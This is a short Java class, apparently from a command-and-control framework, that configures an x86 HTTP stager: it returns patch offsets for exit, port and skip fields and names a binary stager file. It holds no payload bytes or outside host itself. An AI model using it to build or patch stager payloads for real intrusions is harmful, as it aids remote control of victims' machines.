package stagers;

import common.Listener;

public abstract class GenericHTTPStagerX86
        extends GenericHTTPStager {
    public GenericHTTPStagerX86(Listener l) {
        super(l);
    }

    @Override
    public int getExitOffset() {
        return 708;
    }

    @Override
    public int getPortOffset() {
        return 191;
    }

    @Override
    public int getSkipOffset() {
        return 736;
    }

    @Override
    public String arch() {
        return "x86";
    }

    @Override
    public String getStagerFile() {
        return "resources/httpstager.bin";
    }
}

